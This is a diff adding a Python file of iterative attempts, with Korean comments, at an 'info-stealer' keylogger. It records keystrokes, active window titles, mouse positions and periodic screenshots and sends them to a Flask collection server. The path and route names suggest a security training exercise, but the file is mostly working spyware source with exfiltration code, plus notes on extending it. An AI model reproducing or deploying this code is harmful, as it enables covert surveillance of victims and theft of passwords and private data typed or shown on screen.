@@ -1,0 +1,372 @@
+
+#################[try01]#####################
+
+### flask 모듈의 Flask 웹 프레임워크와 , 클라이언트 요청에 대한 객체 request
+### 미리 임포트 함
+### Flask 웹프레임워크  ###
+from flask import Flask
+import requests, jsonify
+import json
+from pynput import keyboard     #for keyboard logging
+from datetime import datetime   #for time func
+import threading                #for thread module
+import pyautogui                #keyboard, mouse control module
+import time                     #for time.sleep(1)
+import pygetwindow              
+
+
+
+def getMouse():
+    while True:
+        # 마우스 좌표 출력
+        print(pyautogui.position())
+        #화면을 캡허마녀 날짜이름으로 캡처 파일 생성
+        pyautogui.screenshot(str(datetime.now()).replace(":","_") +".png")
+        time.sleep(1)
+
+def on_press(key):
+    # pygetwindow.getActiveWindow().title 포그라운드로 프로세스 탑지하여 키를 눌렀을 떄
+    # 적용 및 반응하는 프로세스 탐지
+    print(pygetwindow.getActiveWindow().title, pyautogui.position(), datetime.now(), key)
+
+
+# getMouse 함수를ㄹ 새로운 쓰레드를 생성하여 시작
+mouse_thread = threading.Thread(target= getMouse, args=())
+mouse_thread.start()
+
+with keyboard.Listener(on_press= on_press, on_release= None) as lisnter:
+    lisnter.join()
+
+
+
+
+# 플라스크 객체 생성
+app = Flask(__name__)
+
+# 디렉토리 경로 설정과 허용하고자 하는 메서드를 정의
+@app.route("/kisia", methods=["GET", "POST"])
+# 실제 동작하는 함수
+def kisia():
+    # 클라이언트의 요청 객체
+    # print(request.headers)
+    # print(request.get_data())
+    params = json.loads(request.get_data())
+    print(params["1"])
+    
+    # 리턴값은 200 OK
+    return "kisia", 200
+
+
+# print(__name__)
+if __name__ == "__main__":
+    # app.run 통해 웹을 구동
+    # debug 디버깅 메시지 출력   debug=True : 파이썬에서 발생한 모든 오류가 출력되므로 개발시에만 사용
+    # host = 접근 허용 아이피 대역 0.0.0.0 모든아이피 허용
+    # port = 서비스 하고자 하는 tcp 80000
+    app.run(debug = True, host="0.0.0.0", port=8000)
+
+
+
+
+    #####################################[Try01]######
+
+
+
+####[try02]######
+
+from pynput import keyboard     #키보드 로깅용 모듈
+from datetime import datetime   #날짜  시간 함수
+import threading                #쓰레드 모듈
+import pyautogui                #키보드 마우스 제어 모듈
+import time                     #for time.sleep(1)
+import pygetwindow              #
+
+
+
+def getMouse():
+    while True:
+        # 마우스 좌표 출력
+        print(pyautogui.position())
+        #화면을 캡허마녀 날짜이름으로 캡처 파일 생성
+        pyautogui.screenshot(str(datetime.now()).replace(":","_") +".png")
+        time.sleep(1)
+
+def on_press(key):
+    # pygetwindow.getActiveWindow().title 포그라운드로 프로세스 탑지하여 키를 눌렀을 떄
+    # 적용 및 반응하는 프로세스 탐지
+    print(pygetwindow.getActiveWindow().title, pyautogui.position(), datetime.now(), key)
+
+
+# getMouse 함수를ㄹ 새로운 쓰레드를 생성하여 시작
+mouse_thread = threading.Thread(target= getMouse, args=())
+mouse_thread.start()
+
+with keyboard.Listener(on_press= on_press, on_release= None) as lisnter:
+    lisnter.join()
+
+
+####[try02]######
+
+
+
+
+####[try03]######           
+from flask import Flask, request, jsonify
+from pynput import keyboard
+from datetime import datetime
+import threading
+import pyautogui
+import pygetwindow
+import requests
+import time         #for time.sleep()    
+
+app = Flask(__name__)
+
+def on_press(key):
+    active_window = pygetwindow.getActiveWindow().title
+    mouse_position = pyautogui.position()
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    key_info = str(key)
+
+    # Send the information to the server
+    payload = {
+        "active_window": active_window,
+        "mouse_position": mouse_position,
+        "timestamp": current_time,
+        "key_info": key_info
+    }
+    response = requests.post("http://127.0.0.1:8000/kisia", json=payload)
+    # print(response.text)
+
+
+def start_listener():
+    while True:
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+        time.sleep(5)  # Wait for 5 seconds before sending the next information
+
+# threading.Thread(target=start_listener).start()
+
+
+@app.route("/kisia", methods=["GET","POST"])
+def kisia():
+    if request.method == "POST":
+        data = request.json
+        active_window = data["active_window"]
+        mouse_position = data["mouse_position"]
+        timestamp = data["timestamp"]
+        key_info = data["key_info"]
+
+        # Process the received information as needed
+        print("Received data:")
+        print("Active Window:", active_window)
+        print("Mouse Position:", mouse_position)
+        print("Timestamp:", timestamp)
+        print("Key Info:", key_info)
+
+    return "kisia", 200
+
+if __name__ == "__main__":
+    threading.Thread(target=start_listener).start()
+    app.run(debug=True, host="0.0.0.0", port=8000)
+
+
+
+
+
+##################
+#info-server.py와 info-client.py로 나눠야함
+
+
+
+
+
+##########[try04]#################
+[info-stealer.py]
+from pynput import keyboard
+from datetime import datetime
+import threading
+import pyautogui
+import pygetwindow
+import requests
+import time
+
+def on_press(key):
+    active_window = pygetwindow.getActiveWindow().title
+    mouse_position = pyautogui.position()           #
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    key_info = str(key)
+
+    # Send the information to the server
+    payload = {
+        "active_window": active_window,
+        "mouse_position": mouse_position,
+        "timestamp": current_time,
+        "key_info": key_info
+    }
+    response = requests.post("http://127.0.0.1:8000/kisia", json=payload)
+    print(response.text)
+
+
+def start_listener():
+    while True:
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+        time.sleep(1)  # Wait for 5 seconds before sending the next information
+
+if __name__ == "__main__":
+    threading.Thread(target=start_listener).start()
+
+
+
+[info-server.py]
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/kisia", methods=["POST"])
+def kisia():
+    if request.method == "POST":
+        data = request.json
+        active_window = data["active_window"]
+        mouse_position = data["mouse_position"]
+        timestamp = data["timestamp"]
+        key_info = data["key_info"]
+
+        # Process the received information as needed
+        print("Received data:")
+        print("Active Window:", active_window)
+        print("Mouse Position:", mouse_position)
+        print("Timestamp:", timestamp)
+        print("Key Info:", key_info)
+
+    return "kisia", 200
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=8000)
+
+##########################################################
+
+##issue###
+[info-stealer.py] 실행했을 때 키보드가 눌렸을때만 정보가 보내지도록
+def on_press(key)안에 값들이 다 들어가 있음 이부분 고쳐야함
++스크린샷에 정보도 획득해서 서버에다가 보내줘야함
+
+
+[info-server.py]서버에서 어떤식으로 정보를 보여주고 저장할 것인지 수정 필요
++지금은 스크린샷이 안들어가있는데 스크린샹에 대한 정보도 저장하는 방법을 찾아야함
+
+
+
+
+####################[Try05]##################
+[info-stealer.py]
+from pynput import keyboard
+from datetime import datetime
+import threading
+import pyautogui
+import pygetwindow
+import requests
+import time
+import io
+
+
+def on_press(key):
+    # Extract relevant information from the key press event
+    key_value = str(key)
+    send_info(key_info=key_value, flag = False)
+
+
+def send_info(key_info=None, flag =True):
+    active_window = pygetwindow.getActiveWindow().title
+    mouse_position = pyautogui.position()
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    payload = {
+        "active_window": active_window,
+        "mouse_position": mouse_position,
+        "timestamp": current_time,
+        "key_info": key_info
+    }
+    
+    if flag:
+        screenshot = pyautogui.screenshot()
+        # Save the screenshot as a file-like object
+        image_stream = io.BytesIO()
+        screenshot.save(image_stream, format='PNG')
+        image_stream.seek(0)
+        # Prepare the payload with the screenshot file
+        files = {'screenshot': image_stream}
+    else: files =None
+
+    # Send the information and the screenshot file to the server
+    response = requests.post("http://127.0.0.1:8000/kisia", files=files, data=payload)
+    print(response.text)
+
+def realtime_send():
+    while True:
+        send_info()
+        time.sleep(5)  # Send information every 5 seconds
+
+if __name__ == "__main__":
+    threading.Thread(target=realtime_send).start()
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+
+
+
+
+[info-server.py]
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/kisia", methods=["POST"])
+def kisia():
+    if request.method == "POST":
+        active_window = request.form.get("active_window")
+        mouse_position = request.form.get("mouse_position")
+        timestamp = request.form.get("timestamp")
+        key_info = request.form.get("key_info")
+
+        screenshot = request.files["screenshot"]
+        # Process the received information and screenshot as needed
+        # For example, you can save the screenshot to a file
+        screenshot.save("received_screenshot.png")
+
+        # Process the received information as needed
+        print("Received data:")
+        print("Active Window:", active_window)
+        print("Mouse Position:", mouse_position)
+        print("Timestamp:", timestamp)
+        print("Key Info:", key_info)
+
+    return "kisia", 200
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=8000)
+
+
+#############################################
+issue : 스크린샷 정보를 추가하고 
+그거를 보내는과정에 에러가 on_press와 동시에 사용할려다보니 에러가 많음
+예외처리하거나 사진을 바이트 데이터로 바꿔서 보내는 식을 고치던지 해야함
+
+
+
+
+
+
+
+
+
+
+
+TypeError: The view function did not return a valid response. The return type must be a string, dict, list, tuple with headers or status, Response instance, or WSGI callable, but it was a int.
+
+
+
+PS C:\Users\user> & C:/Python/Python311/python.exe c:/workspace/dark-web/info-server.py
